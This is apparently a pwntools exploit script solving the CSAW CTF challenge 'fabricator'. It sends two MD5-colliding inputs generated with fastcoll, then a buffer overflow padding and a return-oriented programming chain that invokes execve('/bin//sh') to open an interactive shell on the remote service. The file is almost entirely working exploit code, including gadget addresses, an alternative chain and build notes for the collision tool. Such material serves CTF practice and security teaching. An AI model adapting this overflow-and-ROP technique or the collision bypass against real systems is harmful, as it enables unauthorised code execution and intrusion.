
# solve fabricator
# by N4T_20

from pwn import *
from time import sleep
import hashlib

local = True
debug = False
if local:
    if debug:
        p = gdb.debug('./fabricator',
            '''
            break runGame
            continue
            ''')
    else:
        #p = process('./fabricator')
        p = remote('localhost',5000)
else:
    p = remote('red.ctf.csaw.io', 8000)

p.recvuntil("prefix:\n\n")
prefix = p.recv(64)

#f = open('./prefix', 'w')
#f.write(prefix)
#f.close()

print("Prefix is " + prefix)
#p.interactive()

f = open('./m1.bin', 'r')
m1 = f.read()
f.close()
#print("m1 = " + str(m1))
#print("length of m1 = " + str(len(m1)))

f = open('./m2.bin', 'r')
m2 = f.read()
f.close()
#print("m2 = " + str(m2))
#print("length of m2 = " + str(len(m2)))

#id1 = m1 + "A"*(400 - len(m1))

# m1 is 192 chars long, ret is at +
payload = "A"*80 + "B"*8 

# ropchain
payload += p64(0x00000000004010dc) # pop rsi ; ret
payload += p64(0x00000000006c10e0) # @ .data
payload += p64(0x000000000041c0c4) # pop rax ; ret
payload += '/bin//sh'
payload += p64(0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
payload += p64(0x00000000004502e5) # pop rdx
payload += p64(0x0)
payload += p64(0x00000000004006c6) # pop rdi ; ret
payload += p64(0x6c10e0) # pointer to /bin/sh
payload += p64(0x00000000004010dc) # pop rsi ; ret
payload += p64(0)
payload += p64(0x000000000041c0c4) # pop rax ; ret
payload += p64(59) # syscall number
payload += p64(0x0000000000407bac) # syscall

'''
    p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c10e0) # @ .data
    p += pack('<Q', 0x000000000041c0c4) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
    p += pack('<Q', 0x000000000044b620) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000485ff1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004006c6) # pop rdi ; ret
    p += pack('<Q', 0x00000000006c10e0) # @ .data
    p += pack('<Q', 0x00000000004010dc) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
    p += pack('<Q', 0x00000000004502e5) # pop rdx ; ret
    p += pack('<Q', 0x00000000006c10e8) # @ .data + 8
    p += pack('<Q', 0x000000000044b620) # xor rax, rax ; ret
'''


print("payload is " + str(len(payload) + len(m1)))
payload += "E"*(400 - (len(payload) + len(m1)))


id1 = m1 + payload
id2 = m2 + payload
#id2 = m2 + "A"*(400 - len(m2))
print("id1: " + str(id1))
print("id2: " + str(id2))
print("length of id1: " + str(len(id1)))
print("length of id2: " + str(len(id2)))

''' checks out
m = hashlib.md5()
m.update(id1)
print(m.hexdigest())

n = hashlib.md5()
n.update(id2)
print(n.hexdigest())
'''

p.recvuntil(">")
p.send(id1)
p.recvuntil(">")

#sleep(15)
p.send(id2)
#p.send(prefix + "A"*(400 - len(prefix)))
p.interactive()

# See end of solver file for details about Fastcoll tool to generate files with identical md5 hashes
# fastcoll tool from https://github.com/brimstone/fastcoll/
# Edited Dockerfile as follows:
'''
#FROM brimstone/debian:sid as builder

# RUN package build-essential libboost-all-dev
#RUN package build-essential autoconf libtool libboost-all-dev
#RUN apt-get install aptitude
FROM debian:stretch as builder

RUN apt update && apt install -y  build-essential libboost-all-dev

#RUN apt-get install build-essential libboost-all-dev

COPY . /fastcoll

WORKDIR /fastcoll

RUN g++ -O3 *.cpp -lboost_filesystem -lboost_program_options -lboost_system \
    -o fastcoll -static \
 && strip fastcoll

FROM scratch

COPY --from=builder /fastcoll/fastcoll /fastcoll

ENTRYPOINT ["/fastcoll"]
'''

# sudo docker run -it -v $PWD:/work -w /work fastcoll --prefixfile prefix -o m1 m2
'''
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: 'm1' and 'm2'
Using prefixfile: 'prefix'
Using initial value: 3aa3e856f0a19c0daddc981a721cada2

Generating first block: ..
Generating second block: S01.
Running time: 0.438771 s
'''

# C library is https://github.com/libtom/libtomcrypt/
# Statically compiled the library with make after the git clone
